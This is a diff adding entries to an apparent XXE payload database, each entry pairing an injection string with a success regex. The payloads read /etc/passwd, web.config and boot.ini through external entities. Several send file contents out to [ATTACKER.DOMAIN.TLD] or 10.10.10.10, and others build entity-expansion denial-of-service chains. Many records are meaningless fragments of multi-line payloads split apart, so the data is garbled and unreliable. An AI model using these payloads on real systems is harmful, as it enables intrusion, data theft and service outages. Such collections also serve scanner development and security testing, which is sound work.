@@ -39741,5 +39741,1864 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-247556",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!--?xml version=\"1.0\" ?-->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247557",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247558",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<userInfo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247559",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<firstName>John</firstName>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247560",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<lastName>&example;</lastName>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247561",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</userInfo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247562",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247563",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE data [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247564",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ELEMENT data (#ANY)>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247565",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY file SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247566",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<data>&file;</data>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247567",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247568",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ELEMENT foo ANY >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247569",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247570",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247571",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247572",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247573",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247574",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247575",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<contacts>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247576",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<contact>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247577",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<name>Jean &xxe; Dupont</name>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247578",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<phone>00 11 22 33 44</phone>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247579",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<address>42 rue du CTF</address>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247580",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<zipcode>75000</zipcode>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247581",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<city>Paris</city>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247582",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</contact>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247583",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</contacts>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247584",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247585",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247586",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247587",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247588",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247589",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY a0 \"dos\" >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247590",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247591",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247592",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247593",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247594",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<data>&a4;</data>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247604",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE r [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247605",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % pe_1 \"<!---->\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247606",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247607",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247608",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247610",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<r/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247611",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE root [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247612",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247614",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<root></root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247620",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE message [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247621",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247622",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % constant 'aaa)>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247623",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247624",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247627",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ELEMENT aa (bb'>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247628",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<message>Text</message>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247629",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247630",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % SuperClass '>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247631",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247632",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247633",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY test \"test\"'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247635",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY &#x25; file SYSTEM \"https://erp.company.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247636",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247637",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" ?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247638",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/ext.dtd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247640",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<message></message>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247641",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247642",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247645",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247646",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247648",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> %ext;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247649",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<r></r>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247650",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247651",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<root>&test;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247652",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247653",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY callhome SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/?%xxe;\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247654",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<foo>&callhome;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247655",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE data SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247656",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<data>&send;</data>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247658",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % file SYSTEM \"file:///sys/power/image_size\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247659",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247661",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ELEMENT r ANY >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247662",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % sp SYSTEM \"http://10.10.10.10/dtd.xml\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247665",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<r>&exfil;</r>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247667",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247668",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247669",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247670",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247672",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<feature name=\"deployer\" version=\"2.0\" install=\"auto\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247673",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</feature>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247674",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</features>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247678",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">",
+    "validation": {
+      "expected_status_code": 200,
